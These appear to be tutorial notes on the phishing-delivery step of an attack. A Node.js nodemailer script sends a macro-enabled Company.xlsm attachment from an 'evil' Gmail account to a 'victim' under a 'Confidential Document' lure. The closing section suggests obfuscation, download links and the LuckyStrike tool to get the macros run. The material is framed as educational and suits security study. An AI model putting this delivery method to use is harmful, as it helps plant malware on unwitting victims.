###### Next Tasks

- Copy the Company.xlsm to our kali
- Send via email the xlsm using the nodejs nodemailer 

## Kali

- Make sure that the attacker's email has got the lesssecureapps enabled 

- https://myaccount.google.com/lesssecureapps

- filename app.js

```bash
node app.js
```

```javascript
var nodemailer = require('nodemailer');

var mail = nodemailer.createTransport({
    service: 'gmail',
    auth: {
		//your gmail credentials
        user: 'evil.sender@example.com',
        pass: 'simpleExamplePassword'
    }
});

var mailOptions = {
    from: 'evil.sender@example.com', //your evil gmail
    to: 'victim@example.com', // victims gmail
    subject: 'Confidential Document',
    text: 'Please do not share the attached xls',
   
    attachments: [

        {   // file on disk as an attachment
            filename: 'Company.xlsm',
            path: 'Company.xlsm' // stream this file
        }
    ]
    
};

mail.sendMail(mailOptions, function (error, info) {
    if (error) {
        console.log(error);
    } else {
        console.log('Email sent: ' + info.response);
    }
});
```

- Result

Email sended

## Victims Emails

- I send it to my self but if you send it to other account, google will notify them that maybe is a phishing email and it will send it to spam

## Conclusion

Obviously we could use and combine more obfuscation techniques with better performance. 

Additionally we could not send the file directly but a link for the user to download the file. 

Finally, with the use of various tools such as LuckyStrike we could not put the user in the process of running macros. 

This was a very simple example and I presented it for educational purposes.
